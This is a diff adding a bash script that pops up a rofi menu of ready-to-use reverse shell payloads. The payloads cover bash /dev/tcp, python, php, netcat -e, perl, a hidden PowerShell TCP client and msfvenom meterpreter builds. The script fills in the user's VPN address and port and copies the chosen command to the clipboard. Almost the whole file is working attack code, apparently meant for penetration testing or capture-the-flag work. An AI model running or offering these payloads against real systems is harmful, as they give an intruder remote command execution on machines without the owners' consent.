@@ -1,0 +1,30 @@
+#!/usr/bin/env bash
+# rofi-payload   Quick reverse shell payload generator (rofi menu)
+# Keybind: Super+Shift+P
+
+LHOST="$(~/.local/bin/hackbar vpn plain 2>/dev/null || hostname -I | awk '{print $1}')"
+LPORT="${1:-4444}"
+
+# Payloads menu
+payload_menu() {
+  local payloads=(
+    "bash — bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
+    "python — python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+    "php — php -r '\$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+    "nc — nc -e /bin/bash LHOST LPORT"
+    "perl — perl -e 'use Socket;\$i=\"LHOST\";\$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"
+    "powershell — powershell -NoP -NonI -W Hidden -Exec Bypass -Command 'function ReverseShellClone() { \$socket = New-Object System.Net.Sockets.TCPClient(\"LHOST\", LPORT); \$stream = \$socket.GetStream(); [byte[]]\$buffer = 0..65535|%{0}; while((\$i = \$stream.Read(\$buffer, 0, \$buffer.Length)) -ne 0) { \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer, 0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \"; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush() }; ReverseShellClone }'"
+    "msfvenom — msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe"
+    "msfvenom elf — msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf"
+  )
+
+  printf '%s\n' "${payloads[@]}" | sed "s/LHOST/$LHOST/g; s/LPORT/$LPORT/g"
+}
+
+# Show in rofi, extract and copy
+sel=$(payload_menu | rofi -dmenu -p "revshell> " -theme-str 'window {width: 100%; height: 100%;}' 2>/dev/null | cut -d'—' -f2- | sed 's/^ //')
+
+if [ -n "$sel" ]; then
+  echo "$sel" | xclip -selection clipboard 2>/dev/null && echo "✓ copied to clipboard"
+  echo "$sel"
+fi
